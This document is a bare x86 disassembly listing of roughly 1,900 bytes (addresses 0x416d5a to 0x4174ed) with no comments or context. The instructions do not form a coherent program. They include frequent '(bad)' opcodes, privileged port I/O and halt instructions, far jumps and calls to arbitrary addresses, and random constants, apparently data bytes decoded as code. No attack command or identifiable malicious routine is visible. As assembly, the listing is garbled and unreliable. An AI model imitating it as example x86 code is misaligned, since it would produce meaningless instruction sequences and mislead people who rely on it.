  416d5a:	sub    eax,esp
  416d5c:	adc    bh,bl
  416d5e:	mov    es,ecx
  416d60:	lds    ecx,FWORD PTR [ebp+0x1ea83bb9]
  416d66:	js     0x416d50
  416d68:	es es in al,0x20
  416d6c:	test   bh,dh
  416d6e:	inc    edi
  416d6f:	retf   0xf307
  416d72:	ins    BYTE PTR es:[edi],dx
  416d73:	ds clc 
  416d75:	aas    
  416d76:	jmp    0x26a8:0xda530c26
  416d7d:	fwait
  416d7e:	cmc    
  416d7f:	lock inc ebx
  416d81:	adc    esp,ecx
  416d83:	sbb    eax,0x8f98e637
  416d88:	sar    DWORD PTR [edi],1
  416d8a:	mov    ebp,0xafae2ecf
  416d8f:	pop    edx
  416d90:	repz hlt 
  416d92:	shl    BYTE PTR [ecx],cl
  416d94:	dec    esp
  416d95:	inc    ecx
  416d96:	addr16 mov cl,0x58
  416d99:	test   eax,0xcf0a8bbc
  416d9e:	jno    0x416d35
  416da0:	leave  
  416da1:	xor    DWORD PTR [ecx+0x46236d15],esi
  416da7:	test   al,0xef
  416da9:	pop    ecx
  416daa:	fs push esi
  416dac:	out    0x61,eax
  416dae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416daf:	dec    ebx
  416db0:	add    DWORD PTR [ecx],esp
  416db2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416db3:	and    DWORD PTR [ecx],0xffffffe1
  416db6:	pop    ebx
  416db7:	inc    ebx
  416db8:	out    dx,al
  416db9:	mov    ch,0x96
  416dbb:	inc    DWORD PTR [ecx+0x1f]
  416dbe:	test   DWORD PTR [edx+ebp*2+0x21d735b9],esp
  416dc5:	add    al,0xca
  416dc7:	mov    BYTE PTR [esi-0x1f1221ea],cl
  416dcd:	popa   
  416dce:	or     eax,0x5f99338c
  416dd3:	or     esp,DWORD PTR [ebp-0x3e]
  416dd6:	cmp    al,BYTE PTR [edx-0x38]
  416dd9:	xchg   ebx,eax
  416dda:	mov    cl,0x47
  416ddc:	stc    
  416ddd:	data16 aad 0xb2
  416de0:	pop    ss
  416de1:	mov    cl,0x1
  416de3:	aad    0x66
  416de5:	and    ebp,DWORD PTR [ebp+0x5b]
  416de8:	cld    
  416de9:	ret    0x671b
  416dec:	jge    0x416d85
  416dee:	push   es
  416def:	sub    ch,ah
  416df1:	loopne 0x416e0e
  416df3:	clc    
  416df4:	out    dx,eax
  416df5:	scas   al,BYTE PTR es:[edi]
  416df6:	dec    eax
  416df7:	pop    edx
  416df8:	in     eax,0x4
  416dfa:	aam    0x2c
  416dfc:	push   ebx
  416dfd:	dec    edi
  416dfe:	test   DWORD PTR [esi+0x40],esi
  416e01:	mov    al,ds:0x18373a1f
  416e06:	pop    eax
  416e07:	xor    al,0x66
  416e09:	nop
  416e0a:	pusha  
  416e0b:	xor    DWORD PTR [edx+0x757c6d73],ecx
  416e11:	add    DWORD PTR [edx+0x73],edx
  416e14:	pop    edi
  416e15:	cmp    ecx,DWORD PTR [ebx-0x39508e71]
  416e1b:	push   esp
  416e1c:	mov    esi,0x192157b4
  416e21:	mov    cl,0x4c
  416e23:	es dec ebx
  416e25:	pop    es
  416e26:	lock (bad) 
  416e28:	sub    ebp,esp
  416e2a:	call   0x6ffeb029
  416e2f:	arpl   bx,cx
  416e31:	fnstcw WORD PTR [edx]
  416e33:	int    0x85
  416e35:	rol    BYTE PTR [eax-0x3147fca4],cl
  416e3b:	inc    esi
  416e3c:	sbb    al,0xf3
  416e3e:	push   0xd9420dfe
  416e43:	push   ebx
  416e44:	and    al,0x1c
  416e46:	icebp  
  416e47:	test   BYTE PTR [edi-0xfa447b9],0x92
  416e4e:	mov    ebx,0x4ac91ed6
  416e53:	adc    cl,BYTE PTR [esi]
  416e55:	fisubr WORD PTR [ebx]
  416e57:	mov    ebx,DWORD PTR [edi+0x7ad0afeb]
  416e5d:	push   ebp
  416e5e:	shr    ah,1
  416e60:	xchg   edi,eax
  416e61:	adc    edi,ecx
  416e63:	ret    0xe610
  416e66:	aaa    
  416e67:	and    al,0x8d
  416e69:	imul   edi,DWORD PTR [edx],0xffffffd0
  416e6c:	xor    esi,ebp
  416e6e:	xchg   BYTE PTR [edx+0xb],dh
  416e71:	adc    DWORD PTR [edi],edx
  416e73:	fcomi  st,st(1)
  416e75:	out    dx,eax
  416e76:	les    ebp,FWORD PTR [edi]
  416e78:	jp     0x416ed3
  416e7a:	leave  
  416e7b:	and    ah,dh
  416e7d:	push   ebx
  416e7e:	in     eax,0x45
  416e80:	mov    ds:0x985c4203,eax
  416e85:	ds mov dl,0xf6
  416e88:	fistp  QWORD PTR [esi+0x52]
  416e8b:	mov    edi,gs
  416e8d:	nop
  416e8e:	clc    
  416e8f:	cmp    al,0xd4
  416e91:	aad    0x50
  416e93:	call   0xff781fa0
  416e98:	sbb    eax,0xe8fbb8f
  416e9d:	leave  
  416e9e:	or     dh,0x8c
  416ea1:	cld    
  416ea2:	dec    ebx
  416ea3:	sbb    al,0x57
  416ea5:	call   0x623288ea
  416eaa:	repz mov bh,0xb4
  416ead:	(bad)  
  416eae:	(bad)  
  416eaf:	pop    ebx
  416eb0:	inc    esi
  416eb1:	add    eax,0xbf1c6e56
  416eb6:	out    0x6b,al
  416eb8:	mov    cl,0x2c
  416eba:	push   ecx
  416ebb:	cs fwait
  416ebd:	ins    DWORD PTR es:[edi],dx
  416ebe:	test   eax,0x89cfecf1
  416ec3:	add    al,BYTE PTR [edi+0x4e]
  416ec6:	xchg   ebx,eax
  416ec7:	xor    ecx,DWORD PTR [edi-0x7f35cea7]
  416ecd:	shl    DWORD PTR [ebx+edx*1+0x7844f7df],cl
  416ed4:	or     bl,BYTE PTR [eax]
  416ed6:	retf   0x3066
  416ed9:	sahf   
  416eda:	lock (bad) 
  416edd:	fadd   st(4),st
  416edf:	nop
  416ee0:	je     0x416f07
  416ee2:	arpl   WORD PTR [ebx-0x23],di
  416ee5:	ja     0x416f52
  416ee7:	idiv   BYTE PTR [esp+ebx*1]
  416eea:	ins    DWORD PTR es:[edi],dx
  416eeb:	scas   al,BYTE PTR es:[edi]
  416eec:	pop    ebp
  416eed:	inc    edi
  416eee:	mov    bp,0x2b41
  416ef2:	iret   
  416ef3:	shl    DWORD PTR [ebx],cl
  416ef5:	cmp    al,0x6c
  416ef7:	addr16 push ebx
  416ef9:	pop    ds
  416efa:	cwde   
  416efb:	aaa    
  416efc:	xor    BYTE PTR [ebx+0x28],bh
  416eff:	cli    
  416f00:	test   al,0xb3
  416f02:	xchg   ecx,eax
  416f03:	arpl   WORD PTR [esi],di
  416f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f06:	jge    0x416eb2
  416f08:	repz push ss
  416f0a:	add    dl,BYTE PTR [ebx-0x18]
  416f0d:	lods   eax,DWORD PTR ds:[esi]
  416f0e:	adc    DWORD PTR [ecx-0x1a330172],ebx
  416f14:	inc    edi
  416f15:	mov    WORD PTR [edi],ss
  416f17:	xor    cl,BYTE PTR [ebp-0x7c]
  416f1a:	xchg   edi,eax
  416f1b:	iret   
  416f1c:	push   ds
  416f1d:	mov    BYTE PTR ds:0x954e6a3c,cl
  416f23:	mov    esi,0xb5bed7b7
  416f28:	hlt    
  416f29:	jae    0x416f23
  416f2b:	ds ret 
  416f2d:	jge    0x416f15
  416f2f:	lods   al,BYTE PTR ds:[esi]
  416f30:	repnz mov cs,WORD PTR [esi+0x26]
  416f34:	add    DWORD PTR [ecx],edx
  416f36:	stc    
  416f37:	jno    0x416f15
  416f39:	push   ds
  416f3a:	jmp    0x34832cd3
  416f3f:	adc    BYTE PTR [ebx],ah
  416f41:	cmp    DWORD PTR [ebx],ebx
  416f43:	push   0xd891544b
  416f48:	rcl    BYTE PTR [ebp-0x7],cl
  416f4b:	jg     0x416faf
  416f4d:	jne    0x416f51
  416f4f:	dec    esi
  416f50:	test   al,0xdc
  416f52:	cmp    dl,dh
  416f54:	push   ecx
  416f55:	lods   al,BYTE PTR ds:[esi]
  416f56:	mov    bl,0xbe
  416f58:	mov    edx,0x8aa3bcf5
  416f5d:	jge    0x416fc9
  416f5f:	mov    ch,0x19
  416f61:	jnp    0x416fbe
  416f63:	push   esi
  416f64:	call   0xc4de:0x5c097cdb
  416f6b:	pop    eax
  416f6c:	sbb    al,0xb
  416f6e:	add    eax,0xd0bacb49
  416f73:	ror    BYTE PTR [edx],1
  416f75:	out    dx,al
  416f76:	fnstsw WORD PTR [edx-0x2f]
  416f79:	cdq    
  416f7a:	cmc    
  416f7b:	sub    esi,DWORD PTR [edx-0x31cbe55e]
  416f81:	push   esi
  416f82:	fld    QWORD PTR [edx]
  416f84:	fisttp DWORD PTR [edx+0x53]
  416f87:	and    BYTE PTR [eax-0x7f],0x1
  416f8b:	jle    0x416f3e
  416f8d:	cmp    eax,0xa474d3e4
  416f92:	sbb    edx,esp
  416f94:	add    eax,0xcd3950cf
  416f99:	inc    ebp
  416f9a:	aas    
  416f9b:	or     esp,esp
  416f9d:	lods   al,BYTE PTR ds:[esi]
  416f9e:	mov    ds:0xfd76689f,al
  416fa3:	outs   dx,BYTE PTR es:[esi]
  416fa5:	in     eax,dx
  416fa6:	into   
  416fa7:	jne    0x416fe9
  416fa9:	jmp    0xd3adf047
  416fae:	jb     0x417021
  416fb0:	arpl   si,si
  416fb2:	adc    ah,BYTE PTR [edx+eiz*8+0x5b]
  416fb6:	lea    edx,[ebx+0x24]
  416fb9:	into   
  416fba:	les    edx,FWORD PTR [ebx]
  416fbc:	push   cs
  416fbd:	push   esi
  416fbe:	push   ecx
  416fbf:	and    ebx,DWORD PTR [edi+0x23fe0131]
  416fc5:	jo     0x416fae
  416fc7:	clc    
  416fc8:	jns    0x416f4b
  416fca:	pop    ebx
  416fcb:	dec    eax
  416fcc:	imul   DWORD PTR [ebp+0x8]
  416fcf:	adc    ah,BYTE PTR [edi]
  416fd1:	sahf   
  416fd2:	adc    esp,eax
  416fd4:	sbb    eax,0x34919aff
  416fd9:	es popa 
  416fdb:	mov    WORD PTR [eax+0x30c40b4],fs
  416fe1:	or     BYTE PTR [esi+0x53],cl
  416fe4:	pop    ebp
  416fe5:	jmp    0xbf8c63e5
  416fea:	push   ds
  416feb:	in     al,0x9e
  416fed:	outs   dx,DWORD PTR ds:[esi]
  416fee:	jbe    0x417017
  416ff0:	mov    eax,0x79ed566d
  416ff5:	stc    
  416ff6:	sub    al,0xba
  416ff8:	or     DWORD PTR [eax+0x56906870],edx
  416ffe:	mov    BYTE PTR [ecx+0x3c],0x4
  417002:	cmp    esi,DWORD PTR [edx]
  417004:	ss push cs
  417006:	inc    edx
  417007:	sbb    dl,BYTE PTR [ebx+0x4eab0af9]
  41700d:	je     0x416f99
  41700f:	xchg   esi,eax
  417010:	sub    al,0x90
  417012:	adc    edi,DWORD PTR [edx-0x35205208]
  417018:	or     ch,bl
  41701a:	cmc    
  41701b:	mov    WORD PTR [esp+edx*1+0x1],ss
  41701f:	mov    DWORD PTR [edx+esi*1-0x6b2832bb],eax
  417026:	mul    dl
  417028:	inc    ebx
  417029:	mov    ds:0x8bf47bab,eax
  41702e:	lahf   
  41702f:	test   al,0xd5
  417031:	loope  0x416ff9
  417033:	dec    esp
  417034:	aas    
  417035:	or     ebp,esi
  417037:	inc    esi
  417038:	je     0x417076
  41703a:	ja     0x416fed
  41703c:	inc    DWORD PTR [esi+0x3a4688c1]
  417042:	and    ch,dh
  417044:	in     al,dx
  417045:	xor    BYTE PTR [edx+0x39b99e08],al
  41704b:	mov    bh,0xed
  41704d:	push   ds
  41704e:	dec    edi
  41704f:	inc    ebx
  417050:	lock int3 
  417052:	pop    ecx
  417053:	cmp    ebx,DWORD PTR [ebx+0x40009f39]
  417059:	sub    esp,DWORD PTR [edx-0x30]
  41705c:	mov    ebx,0x95a2ba8c
  417061:	es enter 0x1f1e,0x7
  417066:	push   0xfffffffb
  417068:	test   eax,0x576d1e41
  41706d:	(bad)  
  41706e:	sbb    edi,DWORD PTR [eax]
  417070:	stos   BYTE PTR es:[edi],al
  417071:	and    ah,cl
  417073:	xchg   edx,eax
  417074:	jecxz  0x4170cf
  417076:	test   eax,0x6b760623
  41707b:	scas   eax,DWORD PTR es:[edi]
  41707c:	pop    esp
  41707d:	sub    ebx,DWORD PTR [esi]
  41707f:	jno    0x417046
  417081:	clc    
  417082:	dec    edx
  417083:	jne    0x4170cc
  417085:	out    0x33,al
  417087:	or     DWORD PTR [edx-0x34415db6],0xfffffffd
  41708e:	hlt    
  41708f:	test   al,0x70
  417091:	xor    eax,0x707464f6
  417096:	data16 mov WORD PTR [edx],ds
  417099:	call   0x2a135cf
  41709e:	xchg   edi,eax
  41709f:	xlat   BYTE PTR ds:[ebx]
  4170a0:	cmp    ebx,eax
  4170a2:	dec    edi
  4170a3:	(bad)  
  4170a4:	adc    ah,BYTE PTR [ecx+0x35a65b4]
  4170aa:	int    0xca
  4170ac:	mov    ebp,0xe18bf501
  4170b1:	pop    esp
  4170b3:	and    eax,0x8797d713
  4170b8:	sbb    ebp,DWORD PTR [eax-0x41]
  4170bb:	xor    al,0x40
  4170bd:	xchg   edx,eax
  4170be:	out    dx,eax
  4170bf:	sub    DWORD PTR [esi+0x5f851373],ebp
  4170c5:	scas   al,BYTE PTR es:[edi]
  4170c6:	sbb    eax,0x78ea5bb9
  4170cb:	xchg   esi,eax
  4170cc:	pop    ecx
  4170cd:	iret   
  4170ce:	xchg   BYTE PTR [ecx+0x455651fb],bh
  4170d4:	mov    ch,0xaf
  4170d6:	and    dl,BYTE PTR [edx]
  4170d8:	daa    
  4170d9:	cmp    BYTE PTR [edx],dl
  4170db:	mov    ds,WORD PTR [edx]
  4170dd:	mov    ds:0x10d846b6,eax
  4170e2:	xchg   esp,eax
  4170e3:	shl    BYTE PTR [edx],0x3a
  4170e6:	mov    eax,0xa43e9488
  4170eb:	pop    esp
  4170ec:	xor    BYTE PTR [ecx+edx*1-0x14],ch
  4170f0:	fwait
  4170f1:	pop    edi
  4170f2:	cmp    bh,dh
  4170f4:	mov    ds:0x89bced61,eax
  4170f9:	out    0x79,eax
  4170fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170fc:	mov    al,ds:0x624c3f9f
  417101:	mov    edi,0xe0f385e7
  417106:	js     0x417169
  417108:	pop    eax
  417109:	xchg   ecx,eax
  41710a:	fisub  DWORD PTR [ecx]
  41710c:	xor    esi,esp
  41710e:	add    BYTE PTR [ebx-0x6b8405c7],dh
  417114:	inc    ecx
  417115:	dec    esp
  417116:	inc    ebx
  417117:	aaa    
  417118:	pop    edx
  417119:	inc    edx
  41711a:	add    eax,0xd8bf27bb
  41711f:	imul   ebx
  417121:	fimul  WORD PTR [esi-0x78]
  417124:	jl     0x4170cf
  417126:	mov    edx,fs
  417128:	inc    esp
  417129:	scas   al,BYTE PTR es:[edi]
  41712a:	sar    ch,0x6
  41712d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41712e:	cli    
  41712f:	pop    edi
  417130:	hlt    
  417131:	or     BYTE PTR [edi+0x648dc4e],0x3b
  417138:	je     0x417115
  41713a:	scas   eax,DWORD PTR es:[edi]
  41713b:	lock mov DWORD PTR [ecx+eax*4-0x66],esp
  417140:	les    edi,FWORD PTR [edx+eax*1]
  417143:	clc    
  417144:	pushf  
  417145:	shl    BYTE PTR [eax-0x4f04f30a],1
  41714b:	xchg   esi,eax
  41714c:	pop    esi
  41714d:	out    dx,al
  41714e:	inc    esp
  41714f:	jno    0x417170
  417151:	outs   dx,DWORD PTR ds:[esi]
  417152:	sar    ebp,0x54
  417155:	stos   DWORD PTR es:[edi],eax
  417156:	aam    0x86
  417158:	adc    al,0xaa
  41715a:	shr    cl,cl
  41715c:	popa   
  41715d:	ins    DWORD PTR es:[edi],dx
  41715e:	(bad)  
  41715f:	jmp    0x417194
  417161:	out    dx,eax
  417162:	fidivr WORD PTR [edi]
  417164:	adc    eax,0x886b2280
  417169:	mov    ds:0x65fb380d,al
  41716e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41716f:	inc    ebx
  417170:	fsubr  st,st(0)
  417172:	clc    
  417173:	sub    BYTE PTR [ecx-0x43],bh
  417176:	or     eax,0xb179bfa8
  41717b:	pop    edi
  41717c:	inc    edx
  41717d:	jbe    0x417190
  41717f:	or     eax,0xa69f1a92
  417184:	push   edx
  417186:	fnclex 
  417188:	push   0x9c535c7d
  41718d:	(bad)  
  41718f:	inc    edx
  417190:	pusha  
  417191:	sbb    eax,0x4173e86
  417196:	mov    ah,0x56
  417198:	jecxz  0x4171c3
  41719a:	push   ebp
  41719b:	push   0xffffff88
  41719d:	pop    ds
  41719e:	ins    DWORD PTR es:[edi],dx
  41719f:	or     eax,DWORD PTR [edi]
  4171a1:	leave  
  4171a2:	out    0x41,eax
  4171a4:	lea    ebx,[edi+edi*2-0x68a89593]
  4171ab:	or     eax,0xf47af9eb
  4171b0:	cdq    
  4171b1:	dec    ebp
  4171b2:	inc    edx
  4171b3:	add    esi,esi
  4171b5:	pushf  
  4171b6:	imul   ecx,DWORD PTR [edi],0x46
  4171b9:	jne    0x417151
  4171bb:	lahf   
  4171bc:	call   0x658fd1c2
  4171c1:	sub    BYTE PTR [eax],dh
  4171c3:	pop    ds
  4171c4:	mov    dl,0x36
  4171c6:	nop
  4171c7:	cs stos DWORD PTR es:[edi],eax
  4171c9:	(bad)  
  4171ca:	shr    BYTE PTR [eax-0x2469db1d],cl
  4171d0:	cmp    edx,DWORD PTR [edx]
  4171d2:	adc    dh,bl
  4171d4:	ja     0x41724f
  4171d6:	mov    eax,ds:0x253130e4
  4171db:	cmp    esi,DWORD PTR [esi]
  4171dd:	pop    ds
  4171de:	sbb    DWORD PTR ds:0xb3e94bd3,ebx
  4171e4:	les    esp,FWORD PTR [ebx+ebx*4]
  4171e7:	dec    esi
  4171e8:	in     al,0xfa
  4171ea:	or     DWORD PTR [esp+edx*4],eax
  4171ed:	bound  ebx,QWORD PTR [edi]
  4171ef:	and    edi,DWORD PTR [esi+esi*1+0x6a]
  4171f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171f4:	push   ss
  4171f5:	clc    
  4171f6:	daa    
  4171f7:	push   es
  4171f8:	add    eax,0x5d3486ce
  4171fd:	mov    al,0x9c
  4171ff:	aam    0x9d
  417201:	sub    edi,edi
  417203:	gs fwait
  417205:	loope  0x4171c9
  417207:	xchg   esp,eax
  417208:	push   esi
  417209:	(bad)  
  41720a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41720b:	pusha  
  41720c:	xor    al,0xdc
  41720e:	in     al,dx
  41720f:	xor    al,0xd2
  417211:	stos   BYTE PTR es:[edi],al
  417212:	xchg   BYTE PTR [esi-0x471fa253],cl
  417218:	push   edi
  417219:	jns    0x4171eb
  41721b:	add    esp,DWORD PTR [esi]
  41721d:	xchg   esi,eax
  41721e:	pop    esp
  41721f:	mov    dl,0xf7
  417221:	dec    ebp
  417222:	adc    al,0x67
  417224:	(bad)  [ebx-0x3e0b05a1]
  41722a:	mov    ecx,0x149ce647
  41722f:	ss ins BYTE PTR es:[edi],dx
  417231:	push   0xaa2473cd
  417236:	hlt    
  417237:	retf   0x56c9
  41723a:	ss dec esp
  41723c:	pop    edi
  41723d:	fisub  DWORD PTR [ebp-0x4928bf1d]
  417243:	arpl   WORD PTR [edx+ebp*2+0x2cfb5581],sp
  41724a:	out    0x80,eax
  41724c:	mov    BYTE PTR [ebx-0x24a10a78],cl
  417252:	xor    eax,DWORD PTR [esi]
  417254:	mov    edi,0x1a4b4eaa
  417259:	add    esp,DWORD PTR [edx+0x55c77182]
  41725f:	xchg   BYTE PTR [edx+0x101a6a0e],ah
  417265:	and    eax,0xe06c3763
  41726a:	sbb    dh,al
  41726c:	dec    edi
  41726d:	pop    edi
  41726e:	ss inc eax
  417270:	cmp    cl,bl
  417272:	enter  0x82aa,0x49
  417276:	or     ebp,DWORD PTR [ecx]
  417278:	test   eax,0xc8e8b9d8
  41727d:	inc    ecx
  41727e:	mov    eax,0xc985c1d4
  417283:	in     al,dx
  417284:	lock sahf 
  417286:	aas    
  417287:	int    0x2
  417289:	xchg   ecx,eax
  41728a:	mov    gs,eax
  41728c:	push   ebp
  41728d:	test   BYTE PTR [edi+eiz*2-0x39],bh
  417291:	jae    0x417281
  417293:	fnstenv [ebp-0x7]
  417296:	mov    edx,0x1306c139
  41729b:	or     ch,bl
  41729d:	cmp    DWORD PTR [edi+0x3a],ebx
  4172a0:	(bad)  
  4172a1:	shr    DWORD PTR [edi-0xa],1
  4172a4:	call   FWORD PTR [edi-0x4a]
  4172a7:	fldcw  WORD PTR [eax+ecx*8]
  4172aa:	pushf  
  4172ab:	push   cs
  4172ac:	sub    esi,edx
  4172ae:	cmp    al,0xa0
  4172b0:	lods   al,BYTE PTR ds:[esi]
  4172b1:	jge    0x417262
  4172b3:	lods   eax,DWORD PTR ds:[esi]
  4172b4:	rcr    DWORD PTR [ebp-0x6a9fef1e],0xdc
  4172bb:	call   0xc2aa:0xa03bb714
  4172c2:	in     al,dx
  4172c3:	aas    
  4172c4:	rcl    BYTE PTR [edx],0xb4
  4172c7:	sbb    al,BYTE PTR [eax+edx*1]
  4172ca:	mov    eax,ds:0xc17e24ad
  4172cf:	adc    al,0x3c
  4172d1:	fcom   DWORD PTR [ebp-0x79]
  4172d4:	or     al,0xa8
  4172d6:	outs   dx,DWORD PTR ds:[esi]
  4172d7:	mov    esi,0x347c2a84
  4172dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172dd:	dec    ecx
  4172de:	xor    al,0x11
  4172e0:	sti    
  4172e1:	pop    ds
  4172e2:	add    DWORD PTR [ebp-0x47147af8],ecx
  4172e8:	inc    ebx
  4172e9:	je     0x4172bd
  4172eb:	add    esi,DWORD PTR [ebx]
  4172ed:	test   eax,0x94d7b008
  4172f2:	cmc    
  4172f3:	test   DWORD PTR [ebp-0x5e],eax
  4172f6:	adc    esp,esp
  4172f8:	retf   
  4172f9:	into   
  4172fa:	dec    edi
  4172fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172fc:	(bad)  
  4172fd:	mov    edi,0x95e265e7
  417302:	repnz mov ecx,0x8d4b05c6
  417308:	jno    0x41733c
  41730a:	fadd   DWORD PTR [esi+0x3c]
  41730d:	gs jg  0x41731d
  417310:	cmp    esp,DWORD PTR [edi+0x4d4d1d74]
  417316:	xchg   BYTE PTR [esi-0x2e],bh
  417319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41731a:	xor    eax,edx
  41731c:	je     0x4172e1
  41731e:	inc    esi
  41731f:	pop    edx
  417320:	push   ebx
  417321:	inc    ecx
  417322:	push   eax
  417323:	mov    esi,0x346b4f07
  417328:	xchg   esi,eax
  417329:	(bad)  
  41732a:	test   DWORD PTR ds:[esi-0x3d],eax
  41732e:	stc    
  41732f:	dec    edx
  417330:	xchg   esi,eax
  417331:	pop    ebp
  417332:	in     al,dx
  417333:	jb     0x41733c
  417335:	(bad)
  417339:	ret    
  41733a:	and    al,0xa4
  41733c:	daa    
  41733d:	xchg   DWORD PTR [ecx-0x7b75f3e7],edi
  417343:	push   ebx
  417344:	fisub  WORD PTR [esp+ecx*2+0x4d]
  417348:	pop    ebx
  417349:	(bad)  
  41734a:	push   ss
  41734b:	push   ebp
  41734c:	out    dx,eax
  41734d:	test   ecx,esp
  41734f:	xor    BYTE PTR [eax],bl
  417351:	adc    al,0x46
  417353:	cmp    DWORD PTR [edi-0xc],eax
  417356:	or     dh,ch
  417358:	or     al,0x54
  41735a:	pop    ebx
  41735b:	jl     0x417309
  41735d:	(bad)  
  41735e:	jb     0x417348
  417360:	inc    eax
  417361:	popf   
  417362:	inc    edi
  417363:	jo     0x417370
  417365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417366:	int    0x37
  417368:	sbb    BYTE PTR [ecx+0x1f],al
  41736b:	sbb    BYTE PTR [ebx-0x28],dl
  41736e:	xor    DWORD PTR [ebx+0x67],ebp
  417371:	fbstp  TBYTE PTR [edx+0x4a79655e]
  417377:	cmp    eax,0xa6fa3bec
  41737c:	and    al,0x42
  41737e:	sub    esp,DWORD PTR [esi-0x71368129]
  417384:	xchg   ebx,eax
  417385:	test   eax,0xecdee028
  41738a:	(bad)  
  41738b:	rol    DWORD PTR [ecx],cl
  41738d:	inc    ecx
  41738e:	fst    QWORD PTR [ebp+0x18]
  417391:	or     al,0xbd
  417393:	xor    BYTE PTR [esi+ebx*8-0x2],al
  417397:	(bad)  
  417398:	cwde   
  417399:	sub    DWORD PTR [eax+esi*1+0x217396b4],0xffffff93
  4173a1:	mov    edi,DWORD PTR [edi+esi*1+0xe]
  4173a5:	mov    eax,ds:0xb00e171e
  4173aa:	push   ecx
  4173ab:	pop    edx
  4173ac:	mov    ds:0x2e766048,eax
  4173b1:	fidivr DWORD PTR [ebx+0x51058806]
  4173b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173b8:	out    dx,eax
  4173b9:	loop   0x4173f5
  4173bb:	sub    edi,esp
  4173bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173be:	fnsave [edi+0x7f]
  4173c1:	out    dx,eax
  4173c2:	inc    edi
  4173c3:	stc    
  4173c4:	clc    
  4173c5:	pop    esp
  4173c6:	repz jbe 0x4173db
  4173c9:	sbb    eax,0x25cc7fa0
  4173ce:	fist   WORD PTR [edx-0x4889e960]
  4173d4:	sub    ah,BYTE PTR [edi]
  4173d6:	call   0x2ea9:0xe23fed21
  4173dd:	sbb    bl,cl
  4173df:	sub    eax,0xf35b90e1
  4173e4:	add    al,0x27
  4173e6:	aam    0x4a
  4173e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e9:	(bad)  
  4173ea:	imul   ebp,eax,0xd6a473be
  4173f0:	call   0x67c2:0x80564b5d
  4173f7:	mov    es,WORD PTR [ebp-0x2b8c1e75]
  4173fd:	and    al,0xab
  4173ff:	push   ss
  417400:	mov    cl,0x6a
  417402:	sbb    al,0x7a
  417404:	cmp    al,0xd1
  417406:	add    DWORD PTR [esi-0x58],0x79
  41740a:	test   bh,bh
  41740c:	ret    
  41740d:	mov    dl,0x74
  41740f:	fwait
  417410:	xchg   ecx,eax
  417411:	mov    ebx,0xbf1c5ee0
  417416:	daa    
  417417:	and    al,0xaf
  417419:	fwait
  41741a:	dec    esp
  41741b:	int3   
  41741c:	dec    esp
  41741d:	fisttp DWORD PTR [ebp+0x5e3e4ba4]
  417423:	jmp    0xd000:0x3308d36d
  41742a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41742b:	mov    ebp,0xeeff6f68
  417430:	xor    DWORD PTR [ebp+0x29c21e5c],esp
  417436:	(bad)  
  417437:	jp     0x417404
  417439:	add    eax,0x70271a9
  41743e:	mov    ch,0x1b
  417440:	xchg   bh,dh
  417442:	sti    
  417443:	or     al,0xef
  417445:	pop    ecx
  417446:	xor    BYTE PTR [esi-0x5e],ch
  417449:	add    DWORD PTR [eax-0x7d],edx
  41744c:	inc    ebx
  41744d:	sub    eax,0xff01008d
  417452:	and    dl,ch
  417454:	bound  ebp,QWORD PTR [esi-0x1]
  417457:	mov    ebp,eax
  417459:	inc    edx
  41745a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41745b:	aad    0x24
  41745d:	aaa    
  41745e:	fstp   TBYTE PTR [edi+0x327c4cec]
  417464:	cmp    dh,BYTE PTR [ebx-0x6f]
  417467:	iret   
  417468:	xlat   BYTE PTR ds:[ebx]
  417469:	sbb    eax,DWORD PTR [edx]
  41746b:	jp     0x41742c
  41746d:	daa    
  41746e:	jbe    0x417430
  417470:	pop    eax
  417471:	(bad)  
  417472:	mov    dh,ch
  417474:	ins    BYTE PTR es:[edi],dx
  417475:	dec    edi
  417476:	loopne 0x41746b
  417478:	mov    al,BYTE PTR [esi-0x2d]
  41747b:	popa   
  41747c:	imul   esp,DWORD PTR [eax+0x5d],0xffffff9a
  417480:	push   esp
  417481:	cmp    al,0xf8
  417483:	pop    edx
  417484:	inc    esp
  417485:	adc    BYTE PTR [ebx+0x68cd114e],ch
  41748b:	cli    
  41748c:	jae    0x4174a6
  41748e:	(bad)  
  417490:	loop   0x4174fd
  417492:	mov    ch,0xd0
  417494:	clc    
  417495:	out    dx,eax
  417496:	or     BYTE PTR [ebp+0x54],bl
  417499:	jno    0x41745b
  41749b:	and    eax,0x7ea0ddc8
  4174a0:	mov    al,ds:0xd856bc59
  4174a5:	inc    edi
  4174a6:	cmc    
  4174a7:	(bad)  
  4174a8:	popa   
  4174a9:	sbb    eax,0x936fcf76
  4174ae:	pop    ecx
  4174af:	repz adc bl,BYTE PTR [ebx+0x25]
  4174b3:	outs   dx,BYTE PTR ds:[esi]
  4174b4:	push   0x20
  4174b6:	fdivrp st(3),st
  4174b8:	hlt    
  4174b9:	lods   al,BYTE PTR ds:[esi]
  4174ba:	cli    
  4174bb:	fmul   DWORD PTR [edx-0x38240917]
  4174c1:	and    eax,0xdaf3a1f4
  4174c6:	les    eax,FWORD PTR [ecx+eax*1+0x1b731110]
  4174cd:	inc    edx
  4174ce:	mov    ebp,0xe05b4726
  4174d3:	ret    0xee13
  4174d6:	pusha  
  4174d7:	push   ebx
  4174d8:	stc    
  4174d9:	sub    al,0x4a
  4174db:	mov    DWORD PTR [edx-0x2d],edi
  4174de:	nop
  4174df:	jns    0x4174a2
  4174e1:	and    ch,BYTE PTR [ebx]
  4174e3:	pop    ecx
  4174e4:	hlt    
  4174e5:	adc    BYTE PTR [ecx-0x37bc2baf],0x71
  4174ec:	dec    edx
  4174ed:	call   0xfca5e53d
